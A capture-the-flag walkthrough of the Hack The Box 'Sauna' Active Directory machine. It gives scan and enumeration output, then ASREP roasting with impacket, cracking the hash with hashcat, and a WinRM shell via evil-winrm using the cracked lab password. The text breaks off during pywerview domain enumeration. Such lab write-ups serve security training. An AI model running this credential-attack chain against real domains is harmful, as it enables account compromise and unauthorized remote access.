# [sauna](https://app.hackthebox.com/machines/Sauna)

> A Windows Active Directory domain controller serving a web application that reveals employee names. From one of these names a user account name can be derived. This user account doesn't require Kerberos pre-authentication and thus can be ASREP Roasted to retrieve an ASREP, part of which is encrypted with the user's password hash. The password hash can be cracked offline. The resultant credential can be used to remotely access the domain controller via WinRM. Running winPEAS reveals another domain user's credentials in an unattended install file. BloodHound reveals this user has DCSync privileges on the domain. It is possible to use this user's credential to DCSync the domain controller and dump the domain's hashes. Pass the domain administrator's hash to have administrative access to the domain controller.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.95.180 --rate=1000 -e tun0 --output-format grepable --output-filename sauna.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-04 23:04:09 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat sauna.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,3269,389,445,464,49667,49677,49678,49680,49698,49723,53,593,5985,636,80,88,9389,                                                                
```

```bash
$ sudo nmap -sC -sV -O -p135,139,3268,3269,389,445,464,49667,49677,49678,49680,49698,49723,53,593,5985,636,80,88,9389 10.129.95.180 -oA sauna
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 20:31 EDT
Nmap scan report for 10.129.95.180
Host is up (0.039s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-05 07:31:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-11-05T07:32:28
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.84 seconds
```

Ports 53, 88, 389, and 636 indicate that this is a Windows Active Directory Domain Controller. The output from the two LDAP ports seems to indicate that the domain name is `egotistical-bank.local`.

### UDP

```bash
$ sudo nmap -sU 0.129.95.180 
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 20:32 EDT
Nmap scan report for 10.129.95.180
Host is up (0.041s latency).
Not shown: 997 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 23.89 seconds
```

---

## SMB Enumeration

```bash
$ enum4linux -a 10.129.95.180
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Nov  4 20:38:51 2021

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.129.95.180
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 10.129.95.180    |
 =====================================================
[E] Can't find workgroup/domain


 =============================================
|    Nbtstat Information for 10.129.95.180    |
 =============================================
Looking up status of 10.129.95.180
No reply from 10.129.95.180

 ======================================
|    Session Check on 10.129.95.180    |
 ======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.129.95.180 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name:

 ============================================
|    Getting domain SID for 10.129.95.180    |
 ============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: EGOTISTICALBANK
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766
[+] Host is part of a domain (not a workgroup)

 =======================================
|    OS information on 10.129.95.180    |
 =======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.129.95.180 from smbclient:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.129.95.180 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ==============================
|    Users on 10.129.95.180    |
 ==============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 ==========================================
|    Share Enumeration on 10.129.95.180    |
 ==========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.129.95.180

 =====================================================
|    Password Policy Information for 10.129.95.180    |
 =====================================================
[E] Unexpected error from polenum:


[+] Attaching to 10.129.95.180 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.129.95.180)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ===============================
|    Groups on 10.129.95.180    |
 ===============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 ========================================================================
|    Users on 10.129.95.180 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 ==============================================
|    Getting printer info for 10.129.95.180    |
 ==============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Thu Nov  4 20:39:18 2021
```

This really just confirms the name of the domain: `egotistical-bank.local`.

---

## LDAP Enumeration

```bash
$ nmap -n -sV --script "ldap* and not brute" -p 389 10.129.95.180
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 20:43 EDT
Nmap scan report for 10.129.95.180
Host is up (0.041s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
| ldap-search:
|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
|         instanceType: 5
|         whenCreated: 2020/01/23 05:44:25 UTC
|         whenChanged: 2021/11/05 05:59:06 UTC
|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         uSNCreated: 4099
|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC
|         uSNChanged: 102433
|         name: EGOTISTICAL-BANK
|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x9A\x93f\x02\x9E6@I\x95\xCE\x0B\x16\xBF\x87\xD0\x16\x17\x90\x01\x00\x00\x00\x00\x00)Y\x95\x17\x03\x00\x00\x00F\xC6\xFFTH\x85uJ\xBF    \xC2\xD4\x05j\xE2\x8F\x16\x80\x01\x00\x00\x00\x00\x00\x1Cx\x0F\x17\x03\x00\x00\x00\xAB\x8C\xEFx\xD1I\x85D\xB2\xC2\xED\x9Ce\xFE\xAF\xAD\x0C\xE0\x00\x00\x00\x00\x00\x00(8\xFE\x16\x03\x00\x00\x00\xDC\xD1T\x81\xF1a.B\xB4D
|         @     \xE6\x84u\x15p\x01\x00\x00\x00\x00\x00\xD4n\x0F\x17\x03\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00\xD0\xF0
|         \x15\x03\x00\x00\x00\x9B\xF0\xC5\x9Fl\x1D|E\x8B\x15\xFA/\x1A>\x13N\x14`\x01\x00\x00\x00\x00\x00\x10\xD5\x00\x17\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC   \xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00
|         creationTime: 132805655464813260
|         forceLogoff: -9223372036854775808
|         lockoutDuration: -18000000000
|         lockOutObservationWindow: -18000000000
|         lockoutThreshold: 0
|         maxPwdAge: -36288000000000
|         minPwdAge: -864000000000
|         minPwdLength: 7
|         modifiedCountAtLastProm: 0
|         nextRid: 1000
|         pwdProperties: 1
|         pwdHistoryLength: 24
|         objectSid: 1-5-21-2966785786-3096785034-1186376766
|         serverState: 1
|         uASCompat: 1
|         modifiedCount: 1
|         auditingPolicy: \x00\x01
|         nTMixedDomain: 0
|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         systemFlags: -1946157056
|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         isCriticalSystemObject: TRUE
|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         ms-DS-MachineAccountQuota: 10
|         msDS-Behavior-Version: 7
|         msDS-PerUserTrustQuota: 1
|         msDS-AllUsersTrustQuota: 1000
|         msDS-PerUserTrustTombstonesQuota: 10
|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-NcType: 0
|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
|         dc: EGOTISTICAL-BANK
|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
| ldap-rootdse:
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 102477
|       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
|       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       currentTime: 20211105074309.0Z
|_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.93 seconds
```

This output indicates a potential user named `Hugo Smith` and the FQDN of the target: `sauna.egotistical-bank.local`. Add this name, along with the domain name `egotistical-bank.local`, to the local DNS resolver. The output also seems to indicate a potential computer account name: `egotistical-bank.local\sauna$`.

---

## HTTP Enumeration

### Content Discovery

```bash
$ gobuster dir -u http://sauna.egotistical-bank.local -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -x html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sauna.egotistical-bank.local
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
2021/11/04 21:00:09 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 166] [--> http://sauna.egotistical-bank.local/images/]
/index.html           (Status: 200) [Size: 32797]
/css                  (Status: 301) [Size: 163] [--> http://sauna.egotistical-bank.local/css/]
/contact.html         (Status: 200) [Size: 15634]
/blog.html            (Status: 200) [Size: 24695]
/about.html           (Status: 200) [Size: 30954]
/Images               (Status: 301) [Size: 166] [--> http://sauna.egotistical-bank.local/Images/]
/.                    (Status: 200) [Size: 32797]
/fonts                (Status: 301) [Size: 165] [--> http://sauna.egotistical-bank.local/fonts/]
/CSS                  (Status: 301) [Size: 163] [--> http://sauna.egotistical-bank.local/CSS/]
/Contact.html         (Status: 200) [Size: 15634]
/Blog.html            (Status: 200) [Size: 24695]
/About.html           (Status: 200) [Size: 30954]
/Css                  (Status: 301) [Size: 163] [--> http://sauna.egotistical-bank.local/Css/]
/Index.html           (Status: 200) [Size: 32797]
/IMAGES               (Status: 301) [Size: 166] [--> http://sauna.egotistical-bank.local/IMAGES/]
/Fonts                (Status: 301) [Size: 165] [--> http://sauna.egotistical-bank.local/Fonts/]
/single.html          (Status: 200) [Size: 38059]
/ABOUT.html           (Status: 200) [Size: 30954]
/BLOG.html            (Status: 200) [Size: 24695]
/CONTACT.html         (Status: 200) [Size: 15634]
/INDEX.html           (Status: 200) [Size: 32797]

===============================================================
2021/11/04 21:06:15 Finished
===============================================================
```

Nothing here.

### Virtual Host Discovery

```bash
$ gobuster vhost -u http://egotistical-bank.local -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://egotistical-bank.local
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/11/04 21:00:36 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2021/11/04 21:00:59 Finished
===============================================================
```

Nothing here either.

### Manual Enumeration

There appears to be a collection of employee names on `/about.html`.

![Pasted image 20211104213304](images/Pasted%20image%2020211104213304.png)

---

## ASREP Roasting

Translate the names from the web site, along with the name from LDAP, into potential usernames with the format `$FIRST_LETTER$LAST_NAME` (i.e., `hsmith`). Check to see if any of the users are ASREP Roastable.

```bash
$ impacket-GetNPUsers -dc-ip 10.129.95.180 egotistical-bank.local/ -usersfile principals.txt -format hashcat
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sauna$ doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cf23378bd9f900d33258a81c5e1a8290$6c8b538f0817148bd952e545c92cfb6d26aef938942765624431b4d6ab0065fc3bb843b4c11fe1b8ef2b65186a8b10010fec6b813753377bfb11ac94b6671f79456a7bb15534cda30d138adc9c686ec488156e59e838e2b6456a27f28435f035ebc88119d298fd28a968046fb4a78ad8f95d20cbe82f612e73c88b52540511bdad64d2c7a7761b3d649a8fd8ba78630ffbe3c1bab522588414a1c9ae105f7b089404ff42adb111c0be91656cb418f7718b680c886d751b36847e2133194173abfc738f841fac3e3a231b0feadc047ef6b3ef8eeb74aea3389f787270072e2df3107687f8be69acc7d3e72578efc8d1f9f40aa18a8cc6cd6600e94bb7df5b3b77
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

It appears the user `fsmith` is ASREP Roastable. Attempt to crack the returned ASREP with `hashcat`.

```bash
$ hashcat -m 18200 -a 0 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cf23378bd9f900d33258a81c5e1a8290$6c8b538f0817148bd952e545c92cfb6d26aef938942765624431b4d6ab0065fc3bb843b4c11fe1b8ef2b65186a8b10010fec6b813753377bfb11ac94b6671f79456a7bb15534cda30d138adc9c686ec488156e59e838e2b6456a27f28435f035ebc88119d298fd28a968046fb4a78ad8f95d20cbe82f612e73c88b52540511bdad64d2c7a7761b3d649a8fd8ba78630ffbe3c1bab522588414a1c9ae105f7b089404ff42adb111c0be91656cb418f7718b680c886d751b36847e2133194173abfc738f841fac3e3a231b0feadc047ef6b3ef8eeb74aea3389f787270072e2df3107687f8be69acc7d3e72578efc8d1f9f40aa18a8cc6cd6600e94bb7df5b3b77 rockyou.txt
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cf23378bd9f900d33258a81c5e1a8290$6c8b538f0817148bd952e545c92cfb6d26aef938942765624431b4d6ab0065fc3bb843b4c11fe1b8ef2b65186a8b10010fec6b813753377bfb11ac94b6671f79456a7bb15534cda30d138adc9c686ec488156e59e838e2b6456a27f28435f035ebc88119d298fd28a968046fb4a78ad8f95d20cbe82f612e73c88b52540511bdad64d2c7a7761b3d649a8fd8ba78630ffbe3c1bab522588414a1c9ae105f7b089404ff42adb111c0be91656cb418f7718b680c886d751b36847e2133194173abfc738f841fac3e3a231b0feadc047ef6b3ef8eeb74aea3389f787270072e2df3107687f8be69acc7d3e72578efc8d1f9f40aa18a8cc6cd6600e94bb7df5b3b77:Thestrokes23 
```

`egotistical-bank.local\fsmith`'s password is `Thestrokes23`.

---

## WinRM Foothold

The credential `egotistical-bank.local\fsmith`:`Thestrokes23` has WinRM access to the target machine. Grab the user flag.

```bash
$ evil-winrm -i 10.129.95.180 -u egotistical-bank.local\\fsmith -p Thestrokes23

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> ls ../Desktop


    Directory: C:\Users\FSmith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/4/2021  10:59 PM             34 user.txt
```

---

## Domain Enumeration

Use the credential `egotistical-bank.local\fsmith`:`Thestrokes23` to further enumerate the domain.

First, gather information on `egotistical-bank.local\fsmith`.

```bash
$ pywerview get-netuser -w egotistical-bank.local -u fsmith -p Thestrokes23 --dc-ip 10.129.95.180 --username fsmith
accountexpires:                9223372036854775807
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            Fergus Smith
codepage:                      0
countrycode:                   0
displayname:                   Fergus Smith
distinguishedname:             CN=Fergus Smith,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
dscorepropagationdata:         1601-01-01 00:00:00
givenname:                     Fergus
homedirectory:
instancetype:                  4
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2020-01-24 18:27:55.860837
lastlogontimestamp:            132806227623956957
lockouttime:                   0
logoncount:                    8
